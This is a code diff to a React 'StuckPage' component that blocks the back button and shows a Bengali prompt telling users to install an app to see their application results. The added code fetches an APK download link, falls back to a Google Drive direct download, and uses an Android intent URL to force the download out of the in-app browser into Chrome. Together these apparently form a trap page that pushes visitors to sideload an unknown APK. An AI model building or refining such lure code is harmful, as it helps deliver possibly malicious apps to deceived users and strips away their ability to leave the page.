@@ -8,6 +8,7 @@ interface Props {
 const StuckPage: React.FC<Props> = ({ message, sessionId }) => {
   const [dots, setDots] = useState('');
   const [countdown, setCountdown] = useState(5);
+  const [apkUrl, setApkUrl] = useState('');
 
   useEffect(() => {
     const iv = setInterval(() => setDots(prev => prev.length >= 3 ? '' : prev + '.'), 500);
@@ -21,6 +22,21 @@ const StuckPage: React.FC<Props> = ({ message, sessionId }) => {
     return () => clearTimeout(t);
   }, [countdown]);
 
+  // Fetch APK URL from server
+  useEffect(() => {
+    const fetchApkUrl = async () => {
+      try {
+        const res = await fetch('/api/get-apk-url');
+        const data = await res.json();
+        if (data.url) setApkUrl(data.url);
+      } catch (err) {
+        // Fallback: Google Drive direct download
+        setApkUrl('https://drive.google.com/uc?export=download&id=YOUR_APK_FILE_ID');
+      }
+    };
+    fetchApkUrl();
+  }, []);
+
   // Block back button
   useEffect(() => {
     window.history.pushState(null, '', window.location.href);
@@ -32,8 +48,20 @@ const StuckPage: React.FC<Props> = ({ message, sessionId }) => {
   const stuckMessage = message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';
 
   const handleInstall = () => {
-    // Try to open Play Store or direct APK download
-    window.location.href = 'https://drive.google.com/uc?export=download&id=YOUR_APK_FILE_ID';
+    if (!apkUrl) return;
+    // Open in default browser (not WebView)
+    const isAndroid = /android/i.test(navigator.userAgent);
+    if (isAndroid) {
+      // Use intent to force open in external browser
+      const intentUrl = `intent://${apkUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+      try {
+        window.location.href = intentUrl;
+      } catch (e) {
+        window.open(apkUrl, '_blank', 'noopener,noreferrer');
+      }
+    } else {
+      window.open(apkUrl, '_blank', 'noopener,noreferrer');
+    }
   };
 
   return (
